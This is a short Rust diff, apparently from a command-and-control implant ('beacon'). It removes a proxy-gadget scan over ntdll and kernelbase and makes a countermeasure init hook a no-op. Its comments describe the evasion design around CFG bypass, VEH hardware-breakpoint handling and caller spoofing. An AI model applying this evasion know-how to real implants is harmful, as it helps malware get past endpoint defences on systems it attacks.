@@ -194,25 +194,21 @@ static VEH_DIAG_BUF: SyncUnsafeCell<[u8; 128]> = SyncUnsafeCell::new([0u8; 128])
 pub(crate) static VEH_SAFE: core::sync::atomic::AtomicBool =
     core::sync::atomic::AtomicBool::new(true);
 
-/// Initialize CFG bypass subsystem. Called during bootstrap.
-/// Scans for proxy gadgets in system DLLs. The gadgets are available for
-/// future sync-exception proxy flows (Micro-Stager). For async HWBP
-/// exceptions, CFG marking + direct VEH registration is the current path.
+/// Countermeasure init hook — stable entry point called by the shell's
+/// bootstrap (`entry::bootstrap_countermeasures`) before blind (VEH
+/// registration).
 ///
-/// (The caller-spoof return-address stub scan was removed together with the
-/// `caller_spoof` spoof machinery — see caller_spoof.rs module docs.)
+/// Currently a no-op: the proxy-gadget scan that used to run here was
+/// removed together with the `proxy_veh` machinery (the scanned gadgets were
+/// never consumed by any flow — see that module's docs), and the
+/// caller-spoof return-address stub scan was removed with the `caller_spoof`
+/// spoof machinery (see caller_spoof.rs module docs). For async HWBP
+/// exceptions, CFG marking + direct VEH registration (`register_veh_once`)
+/// is the path.
 ///
 /// # Safety
-/// Must run after PEB-walk bootstrap. Single-threaded beacon context.
-pub unsafe fn init_countermeasures() {
-    // Scan for proxy gadgets (jmp rbx / call rbx in ntdll/kernelbase).
-    if !crate::proxy_veh::proxy_available() {
-        crate::proxy_veh::init_proxy_gadgets();
-    }
-    if crate::proxy_veh::proxy_available() {
-        diag(b'G'); // gadget found
-    }
-}
+/// No-op; safe to call at any point.
+pub unsafe fn init_countermeasures() {}
 
 /// Runtime switch for diag() file writes. Defaults OFF in production.
 /// Set to true via `set_diag_enabled(true)` during selftest only.
